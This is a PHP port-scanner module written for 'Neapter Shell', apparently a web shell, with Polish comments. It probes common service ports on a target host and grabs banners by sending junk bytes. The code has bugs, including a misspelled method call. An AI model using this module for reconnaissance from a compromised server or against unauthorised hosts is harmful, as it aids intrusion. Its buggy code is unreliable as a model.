<?php

/**
 * Neapter Shell
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @license   http://www.gnu.org/licenses/gpl-3.0.txt
 */

/**
 * PortScanner - PortScanner wyjatki
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 */
class PortScannerException extends Exception {}

/**
 * class PortScanner - Prosty skaner portow
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 */
class PortScanner
{
	/**
	 * Adres IP maszyny do przeskanowania
	 *
	 * @access protected
	 * @var    string
	 */
	protected $sIp;

	/**
	 * Lista portow do przeskanowania
	 *
	 * @access protected
	 * @var    array
	 */
	protected $aPorts = array
	(
		21,
		22,
		25,
		80,
		81,
		110,
		3306,
		3128,
		8080,
		6379,
		11211
	);

	/**
	 * Ustawianie hosta
	 *
	 * @access public
	 * @param  string      $sValue Adres hosta
	 * @return PortScanner         Obiekt PortScanner
	 */
	public function setHost( $sValue )
	{
		/**
		 * Adres IP
		 */
		if( ip2long( $sValue ) !== FALSE )
		{
			$this -> sIp = $sValue;
		}
		/**
		 * Host 2 IP
		 */
		else if( ( $sIp = gethostbyname( $sValue ) ) !== FALSE )
		{
			$this -> sIp = $sIp;
		}
		else
		{
			throw new PortScannerException( 'Podano błędny adres hosta' );
		}

		return $this;
	}

	/**
	 * Ustawianie portow
	 * Mozliwe jest ustawienia zakresu np. 1-100 (porty od 1 do 100). Rozne
	 * zakresy nalezy oddzielic znakiem przecinka
	 *
	 * @example
	 *     1-100,500-1000
	 *     80,81,82,83
	 *     80-90,3306,3128,6000-7000
	 * @access public
	 * @param  string      $sValue Zakres portow
	 * @return PortScanner         Obiekt PortScanner
	 */
	public function setPort( $sValue )
	{
		$aRange = array();

		$aPorts = explode( ',', $sValue );

		foreach( $aPorts as $sPort )
		{
			/**
			 * Zakres
			 */
			if( strpos( $sPort, '-' ) !== FALSE )
			{
				list( $iMin, $iMax ) = explode( '-', $sPort );

				/**
				 * Sprawdzanie poprawnosci zakresu
				 */
				if( ! (    ctype_digit( $iMin ) && ctype_digit( $iMax )
					&& ( $iMin > 0 ) && ( $iMax < 65536 )
					&& ( $iMin < $iMax )
				      )
				)
				{
					throw new PortScannerException( 'Podano błędny zakres' );
				}

				$aRange = array_merge( $aRange, range( (int) $iMin, (int) $iMax ) );
			}
			/**
			 * Sprawdzanie poprawnosci portu
			 */
			else if( ctype_digit( $sPort ) && ( $sPort > 0 ) && ( $sPort < 65536 ) )
			{
				$aRange[] = (int) $sPort;
			}
			else
			{
				throw new PortScannerException( 'Podano błędny zakres' );
			}
		}

		/**
		 * Usuwanie duplikatow, sortowanie
		 */
		$aRange = array_unique( $aRange );
		sort( $aRange );

		if( $aRange === array() )
		{
			throw new PortScannerException( 'Nie podano zakresu do przeskanowania' );
		}

		$this -> aPorts = $aRange;

		return $this;
	}

	/**
	 * Alias dla setPort
	 *
	 * @access public
	 * @param  string      $sValue Zakres portow
	 * @return PortScanner         Obiekt PortScanner
	 */
	public function setPorts( $sValue )
	{
		return $this -> serPort( $sValue );
	}

	/**
	 * Wywolanie skanowania
	 *
	 * @access public
	 * @return string Informacja o wynikach
	 */
	public function get()
	{
		/**
		 * Adres hosta jest wymagany
		 */
		if( $this -> sIp === NULL )
		{
			throw new PortScannerException( 'Wprowadź adres hosta' );
		}

		$sOutput = sprintf( "Skanowanie %s, porty: %s\r\n", ( $this -> sIp ?: '127.0.0.1' ), implode( ',', $this -> aPorts ) );

		/**
		 * Skanowanie portow
		 */
		foreach( $this -> aPorts as $iPort )
		{
			/**
			 * Proba polaczenia
			 */
			if( ( $rSock = @ fsockopen( 'tcp://' . $this -> sIp, $iPort, $iErrorno = 0, $sErrorstr = NULL, 1 ) ) !== FALSE )
			{
				/**
				 * Info
				 */
				fwrite( $rSock, str_repeat( 'x', 1024 ) . "\r\n\r\n\r\n" );
				$sBanner = preg_replace( '~[^[:print:]]~', ' ', fread( $rSock, 200 ) );
				$sOutput .= sprintf( "%5d - Otwarty - (%s)\r\n", $iPort, $sBanner );
			}
		}

		$sOutput .= "\r\nSkanowanie zakończone";

		return htmlspecialchars( $sOutput );
	}

}

/**
 * ModulePortScanner - Prosty skaner portow
 *
 * @author    Krzysztof Otręba <krzotr@gmail.com>
 * @copyright Copyright (c) 2011, Krzysztof Otręba
 *
 * @package    NeapterShell
 * @subpackage Modules
 */
class ModulePortScanner extends ModuleAbstract
{
	/**
	 * Dostepna lista komend
	 *
	 * @access public
	 * @return array
	 */
	public function getCommands()
	{
		return array
		(
			'portscan',
			'portscanner'
		);
	}

	/**
	 * Zwracanie wersji modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getVersion()
	{
		/**
		 * Wersja Data Autor
		 */
		return '1.01 2011-10-11 - <krzotr@gmail.com>';
	}

	/**
	 * Zwracanie pomocy modulu
	 *
	 * @access public
	 * @return string
	 */
	public function getHelp()
	{
		return <<<DATA
Prosty skaner portow

	Użycie:
		portscanner host [zakres_portow]

	Przykład:
		portscanner 127.0.0.1 80,90,100-200
		portscanner localhost 1-1000,2000-3000
DATA;
	}

	/**
	 * Wywolanie modulu
	 *
	 * @access public
	 * @return string
	 */
	public function get()
	{
		/**
		 * Help
		 */
		if( $this -> oShell -> iArgc > 2 )
		{
			return $this -> getHelp();
		}

		/**
		 * Chmod jest wymagany
		 */
		if( $this -> oShell -> iArgc > 2 )
		{
			return $this -> getHelp();
		}

		try
		{
			$oPortScanner = new PortScanner();

			/**
			 * Host
			 */
			$oPortScanner -> setHost( $this -> oShell -> aArgv[0] );

			/**
			 * Porty
			 */
			if( isset( $this -> oShell -> aArgv[1] ) )
			{
				$oPortScanner -> setPort( $this -> oShell -> aArgv[1] );
			}

			return $oPortScanner -> get();
		}
		catch( PortScannerException $oException )
		{
			return $oException -> getMessage();
		}
	}

}